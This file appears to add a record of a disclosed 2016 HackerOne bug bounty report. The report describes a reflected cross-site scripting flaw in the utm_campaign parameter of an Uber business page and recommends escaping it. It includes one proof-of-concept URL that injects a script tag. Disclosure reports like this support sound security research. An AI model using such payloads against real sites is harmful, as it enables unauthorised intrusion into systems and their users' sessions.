@@ -1,0 +1,17 @@
+ReportLink:https://hackerone.com/reports/125112
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/ddworken
+ReportedTo:Uber(uber)
+BountyAmount:3000.0
+Severity:
+State:Closed
+DateOfDisclosure:06.04.2016 20:59:15
+
+Summary:
+
+'' 'https://getrush.uber.com/business?utm_campaign=tttttt%27%3C/script%3E%3Cscript%3Ealert(0)%3C/script%3E&utm_medium=top&utm_source=website'''
+
+You need to escape the utm_campaign parameter before rendering it in the HTML. 
+
+Thanks, 
+David Dworken 
